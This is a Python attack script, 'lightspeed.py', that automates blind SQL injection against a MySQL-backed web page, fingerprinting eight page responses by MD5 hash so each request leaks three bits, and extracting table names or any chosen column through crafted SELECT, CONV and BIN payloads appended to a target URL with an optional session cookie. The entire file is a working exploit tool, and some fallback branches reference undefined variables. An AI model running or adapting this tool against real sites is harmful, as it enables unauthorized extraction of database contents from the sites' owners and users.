#!/usr/bin/env python3
#
#
# [ 08-28-2020 ]
#
# lightspeed.py
# retrieves 10 MD5 hashes in 2 seconds through blind sql
# injection
#
# written by Ruben Piña [tr3w]
# twitter: @tr3w_
# http://nzt-48.org
#

import sys
import string
import requests
import hashlib
import time
import argparse
import threading

binstr = '00000000'
request = 0x00
hashes = []

def pwn(injection):
       
    global cookie
    global cookies
    if cookies == {} :
        if cookie:
            cookie = cookie.split('=') or cookie
            if not len(cookie) % 2:
                for i in range(0, len(cookie), 2):
                     cookies[cookie[i]] = cookie[i+1]
            else:
                sys.stdout.write('[x] Malformed cookie.\n')
                exit()
    
    url = target + injection
    url = url.replace('+', '%2b')
    url = url.replace(' ', '+')
    r = requests.get(url, cookies=cookies)
    data = r.text
    
        
    global request
    request += 0x01
 
    if use_hashes:
        return hashlib.md5(data.encode('utf-8')).hexdigest()
    else:
        return data.encode('utf-8')

def get_hashes():
  
    ids = tid.split(',')
    if len(ids) != 0x08:
        sys.stdout.write("ERROR: Incorrect number of IDs, must be 8")
        exit()
    ids.sort()
    global hashes

    sys.stdout.write("[+] Generating hashes\n")
    
    hashid = 0x00
    while hashid < 0x08:
        hashes.append(pwn(ids[hashid]))
        sys.stdout.write("\t[-] Hash #%d: %s\n" % (hashid, hashes[hashid]))
        hashid += 0x01

    return hashes

def get_length():

    index = 0x01
    j = 0x01
    
    binlen = '00000000'
    
    global hashes
    global row
    size_limit = 0x00
    sizes = [0xff, 0xffff, 0xffffff, 0xffffffff, 0xffffffffffffffff ]
    c = 0x0
    
    while 0x01:
    
        inj_length = "((SELECT LENGTH(%s)FROM %s LIMIT %d,1)>%d)" % (field, table, row, sizes[c])
        res_length = pwn(inj_length)
        
        #sys.stdout.write("%s\n" % (inj_length))
        
        c += 1

        if hashes[0x00] in res_length:
                break
            
    size = sizes[c - 0x01] + 0x01
    limit = size >> (0x05 * c)
    
    sys.stdout.write("\n\n[+] Calculating length: ")
    sys.stdout.flush()
    
    binlen = ''
    
    for binindex in range(0x01, limit + 0x01, 0x03 ):
       
        injection = "(SELECT CONV(MID(LPAD(BIN(LENGTH(%s)),%d,'0'),%d,3),2,10)FROM %s LIMIT %d,1)" % (field, limit, binindex, table, row) 
        result = pwn(injection)
        
        if not use_hashes:
            while 1:
                if bytes(true_string, 'utf-8') in result:
                    number.append('1')
                elif bytes(false_string, 'utf-8') in result:
                    number.append('0')
                else:
                    return int(''.join(number), 0x02)

        hid = 0x00

        while hid < len(hashes):
            
            if hashes[hid] in result:
                
                i = limit + 0x01 - binindex
                
                if i <3 :   # love and good vibes to everyone
                    b = 0x3 - i
                else:
                    b = 0x00

                if hid == 0x00:
                    bit = '000'[b:]
                elif hid == 0x01:
                    bit = '001'[b:]
                elif hid == 0x02:
                    bit = '010'[b:]
                elif hid == 0x03:
                    bit = '011'[b:]
                elif hid == 0x04:
                    bit = '100'[b:]
                elif hid == 0x05:
                    bit = '101'[b:]
                elif hid == 0x06:
                    bit = '110'[b:]
                elif hid == 0x07:
                    bit = '111'[b:]
                else:
                    sys.stdout.write("Invalid response\n")
                    exit()

                sys.stdout.write("%s" % (bit))
                sys.stdout.flush()
 
                binlen += bit
                break
                
            hid += 0x01

    binlen = int(binlen, 0x02)
    sys.stdout.write('\n[+] Length found: %d\n' % (binlen))
    return binlen


def inject(charindex, binindex):

        global row
        while 1:
            injection = "(SELECT CONV(MID(LPAD(BIN(ASCII(MID(%s,%d,1))),8,'0'),%d,3),2,10)FROM %s LIMIT %d,1)" % (field, charindex, binindex, table, row) 
            result = pwn(injection)
            
            global binstr
            global hashes
            
            if not use_hashes:
                if bytes(true_string, 'utf-8') in result:
                    bitstring.append('1')
                elif bytes(false_string, 'utf-8') in result:
                    bitstring.append('0')
                else:
                    r[index] = string[int(''.join(bitstring), 0x02) - 0x01]
                    return 1




            hid = 0x00
            while hid < len(hashes):
                
                if hashes[hid] in result:
                    
                    if binindex == 0x07:
                        b = 0x01
                    else:
                        b = 0x0

                    if hid == 0x00:
                        bit = '000'[b:]
                    elif hid == 0x01:
                        bit = '001'[b:]
                    elif hid == 0x02:
                        bit = '010'[b:]
                    elif hid == 0x03:
                        bit = '011'[b:]
                    elif hid == 0x04:
                        bit = '100'[b:]
                    elif hid == 0x05:
                        bit = '101'[b:]
                    elif hid == 0x06:
                        bit = '110'[b:]
                    elif hid == 0x07:
                        bit = '111'[b:]
                    else:
                        sys.stdout.write("Invalid response\n")
                        exit()

                    binstr = binstr[ : binindex - 0x01] + bit + binstr[ binindex + 0x02: ]
                    break
                    
                hid += 0x01
            return 1
                        
def start():

    global hashes
    global row
    global number_of_rows
    hashes = get_hashes()

    request = 0x00

    sys.stdout.write("-" * 0x45 + "\n\n" )  

    while row < number_of_rows:
        index = 0x01
        length = get_length()
        sys.stdout.write("\n[+] Found: ")

        while index <= length:

            global binstr
            binstr = '00000000'

            
            t1 = threading.Thread(target = inject, args = (index, 0x1))
            t2 = threading.Thread(target = inject, args = (index, 0x4))
            t3 = threading.Thread(target = inject, args = (index, 0x7))        

            t1.start()
            t2.start()
            t3.start()
            
            t1.join()
            t2.join()
            t3.join()

            sys.stdout.write("%s" % (chr(int(binstr, 0x02))) )    
            sys.stdout.flush()

            index  +=  0x01
        row += 0x01
        
    return 0x01


parser = argparse.ArgumentParser(description="Fast Blind MySQL Injection data extraction by tr3w.")
#            help = 'id of the page when result is false (default: %(default)')
parser.add_argument('-i','--ids',    default = '0,1,2,3,4,5,6,7',    type=str,
        help = 'IDs of 8 consecutive different pages separated by commas (default: %(default)s)')
parser.add_argument('-c','--column',     default = "group_concat(table_name)",
        help = 'Column to extract from table (default: %(default)s)')
parser.add_argument('-t','--table',    default = "information_schema.tables",
        help = 'Table name from where to extract data (default: %(default)s)')
parser.add_argument('-r','--row', default = 0, type=int,
        help = 'Row number to extract, default: 0')
parser.add_argument('-m', '--number_of_rows', default = 1, type=int,
        help = 'Number of rows to extract. (default: %(default)s)')
parser.add_argument('-k', '--cookie', default = '', type=str,
        help = "Session cookie")
parser.add_argument('TARGET', help='The vulnerable URL. Example: http://vuln.com/page.php?id= ')
args = parser.parse_args()

tid = args.ids
field    = args.column
table    = args.table
row = args.row
target    = args.TARGET
use_hashes = 1
number_of_rows = args.number_of_rows + row

cookies = {}
cookie = args.cookie or ''


timer =  time.strftime("%X")
start()
sys.stdout.write("\n\n[+] Start Time: %s " % timer)
sys.stdout.write("\n[+] End Time:   " + time.strftime("%X"))

sys.stdout.write("\n[+] %d requests\n" % (request))
sys.stdout.write("\n[+] Done.\n")
 
